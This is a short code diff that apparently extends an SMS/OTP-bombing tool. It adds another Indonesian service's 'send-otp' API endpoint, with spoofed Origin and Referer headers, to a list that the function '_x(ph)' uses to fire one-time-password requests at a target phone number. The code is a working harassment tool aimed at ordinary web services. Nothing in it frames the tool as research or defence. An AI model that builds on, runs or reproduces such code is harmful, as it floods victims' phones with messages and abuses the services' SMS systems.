@@ -48,4 +48,5 @@ def _x(ph):
         ("LittleHands","https://api.littlehands.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
         ("Aice","https://api.aicegotyou.id/api/v1/auth/phone/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph),"purpose":"register"}),
         ("ArunaBooks","https://arunabooks.id/api/auth/customer/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph)}),
-    ]
+        ("PreciousPreschool","https://api.preciouspreschool.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"*/*","Origin":"https://preciouspreschool.id","Referer":"https://preciouspreschool.id/"},{"phone":_fplus(ph)}),
+                                                                         ]
